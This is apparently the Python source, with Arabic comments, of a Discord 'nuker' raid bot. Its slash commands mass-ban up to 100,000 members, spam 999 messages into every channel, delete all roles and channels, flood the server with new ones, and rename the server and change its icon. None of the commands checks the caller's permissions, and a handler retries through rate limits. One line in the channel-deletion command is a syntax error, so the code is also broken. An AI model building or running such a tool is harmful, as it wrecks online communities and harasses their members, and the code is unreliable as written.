import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import aiohttp
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

# تشغيل سيرفر وهمي عشان راندر ما يقفل الـ Web Service
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running!")

def run_server():
    server = HTTPServer(('0.0.0.0', 10000), SimpleHandler)
    server.serve_forever()

threading.Thread(target=run_server, daemon=True).start()

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

class SecureSpeedBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)

    async def on_ready(self):
        print(f'🚀 تم التشغيل: {self.user.name}')
        try:
            await self.tree.sync()
            print(f'✅ تمت المزامنة التلقائية!')
        except: pass

bot = SecureSpeedBot()

async def safe_execute(coro):
    try:
        return await coro
    except discord.HTTPException as e:
        if e.status == 429:
            await asyncio.sleep(e.retry_after + 0.1)
            return await coro
    except: return None

@bot.command(name="0197")
async def sync_cmd(ctx):
    await bot.tree.sync(guild=ctx.guild)
    await ctx.message.add_reaction("✅")

@bot.tree.command(name="ban", description="تبنيد الأعضاء - الحد 100k")
async def ban(interaction: discord.Interaction, count: int):
    await interaction.response.defer(ephemeral=False)
    members = [m for m in interaction.guild.members if m != bot.user and m != interaction.guild.owner][:min(count, 100000)]
    for m in members: asyncio.create_task(safe_execute(m.ban()))
    await interaction.followup.send("⚡ جاري تنفيذ الباند المتوازي...")

@bot.tree.command(name="ban_token", description="تبنيد الأعضاء الوهميين (التوكن) - الحد 100k")
async def ban_token(interaction: discord.Interaction, count: int):
    await interaction.response.defer(ephemeral=False)
    members = [m for m in interaction.guild.members if m != bot.user][:min(count, 100000)]
    for m in members: asyncio.create_task(safe_execute(m.ban()))
    await interaction.followup.send("⚡ جاري تصفية التوكنات...")

@bot.tree.command(name="name_server", description="تغيير اسم السيرفر")
async def name_server(interaction: discord.Interaction, name: str):
    await interaction.guild.edit(name=name)
    await interaction.response.send_message("✅ تم تغيير الاسم.", ephemeral=True)

@bot.tree.command(name="avatar_servrt", description="تغيير افتار السيرفر")
async def avatar_servrt(interaction: discord.Interaction, url: str):
    await interaction.response.defer(ephemeral=True)
    async with aiohttp.ClientSession() as s:
        async with s.get(url) as r:
            if r.status == 200: await interaction.guild.edit(icon=await r.read())
    await interaction.followup.send("✅ تم تغيير الأفتار.")

@bot.tree.command(name="message", description="سبام رسائل في الرومات")
@app_commands.choices(scope=[app_commands.Choice(name="كل الرومات", value="all"), app_commands.Choice(name="عدد محدد", value="custom")])
async def message(interaction: discord.Interaction, text: str, scope: str, count_channels: int = None):
    await interaction.response.defer(ephemeral=True)
    channels = interaction.guild.text_channels if scope == "all" else interaction.guild.text_channels[:count_channels]
    for c in channels:
        for _ in range(999): asyncio.create_task(safe_execute(c.send(text)))
    await interaction.followup.send("⚡ جاري السبام...")

@bot.tree.command(name="delete_role", description="حذف الرتب")
async def del_role(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    for r in interaction.guild.roles:
        if not r.is_default() and not r.managed: asyncio.create_task(safe_execute(r.delete()))
    await interaction.followup.send("✅ تم.")

@bot.tree.command(name="create_role", description="إنشاء رتب")
async def cre_role(interaction: discord.Interaction, name: str, count: int):
    await interaction.response.defer(ephemeral=True)
    for _ in range(min(count, 250)): asyncio.create_task(safe_execute(interaction.guild.create_role(name=name)))
    await interaction.followup.send("✅ تم.")

@bot.tree.command(name="delete_room", description="حذف عدد معين من الرومات")
@app_commands.describe(count="عدد الرومات المراد حذفها")
async def del_room(interaction: discord.Interaction, count: int):
    await interaction.response.defer(ephemeral=True)
    channels = interaction.guild.text_channels[:min(count, 499)]
    for c: asyncio.create_task(safe_execute(c.delete())) for c in channels
    await interaction.followup.send(f"✅ تم حذف {len(channels)} روم.")

@bot.tree.command(name="create_room", description="إنشاء رومات")
async def cre_room(interaction: discord.Interaction, name: str, count: int):
    await interaction.response.defer(ephemeral=True)
    for _ in range(min(count, 499)): asyncio.create_task(safe_execute(interaction.guild.create_text_channel(name=name)))
    await interaction.followup.send("✅ تم.")

@bot.tree.command(name="rooms", description="تطهير وإنشاء رومات")
async def rooms(interaction: discord.Interaction, name: str, count: int):
    await interaction.response.defer(ephemeral=True)
    for c in interaction.guild.text_channels: await safe_execute(c.delete())
    for _ in range(min(count, 499)): asyncio.create_task(safe_execute(interaction.guild.create_text_channel(name=name)))
    await interaction.followup.send("✅ تم.")

bot.run(os.getenv('TOKEN'))
